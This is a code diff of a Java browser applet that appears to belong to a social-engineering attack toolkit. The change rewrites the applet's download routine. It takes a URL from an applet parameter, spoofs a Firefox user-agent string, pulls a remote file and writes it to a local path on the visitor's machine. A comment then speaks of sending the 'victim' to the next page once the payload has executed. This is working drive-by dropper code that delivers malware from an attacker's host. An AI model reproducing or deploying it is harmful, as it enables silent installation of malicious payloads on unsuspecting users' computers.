@@ -5,6 +5,7 @@ import java.net.URL;
 import java.util.*;
 import sun.misc.BASE64Decoder;
 import java.net.URL;
+import java.net.URLConnection;
 
  /**************************************************************
  *
@@ -87,26 +88,39 @@ public class Java extends Applet {
        	if ( downParm.length() > 0  && pfad.length() > 0 )
 	    {
             // URL parameter
-             URL url = new URL(downParm);
-            // set URL string in case they are checking user agent - hugs mubix
-            url.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"); 
-            // Get an input stream for reading
-            InputStream in = url.openStream();
-            // Create a buffered input stream for efficency
-            BufferedInputStream bufIn = new BufferedInputStream(in);
-            File outputFile = new File(pfad);
-            OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
-            byte[] buffer = new byte[2048];
-            for (;;)  
-                {
-                int nBytes = bufIn.read(buffer);
-                if (nBytes <= 0) break;
-                out.write(buffer, 0, nBytes);
-            }
+            URL url = new URL(downParm);
+            // Open the conneciton
+ 	        URLConnection hc = url.openConnection();
+            // set the user agent string
+            hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
+            // grab content type
+            String contentType = hc.getContentType();
+            // grab content length
+            int contentLength = hc.getContentLength();
+            // pull input stream
+	        InputStream raw = hc.getInputStream();
+            // stream buffer into raw input stream
+    	    InputStream in = new BufferedInputStream(raw);
+            // write the bytes out
+       	    byte[] data = new byte[contentLength];
+            int bytesRead = 0;
+            int offset = 0;
+            while (offset < contentLength) {
+                bytesRead = in.read(data, offset, data.length - offset);
+                if (bytesRead == -1)
+                    break;
+                offset += bytesRead;
+	            }
+            // close it
+            in.close();
+            // write file out to pfad
+            String filename = url.getFile();
+            FileOutputStream out = new FileOutputStream(pfad);
+            // close everything out
+            out.write(data);
             out.flush();
             out.close();
-            in.close();
-        	}
+            }
             // has it executed yet? then target nextPage to victim
             String page = getParameter( "9" );
             if ( page != null && page.length() > 0 )
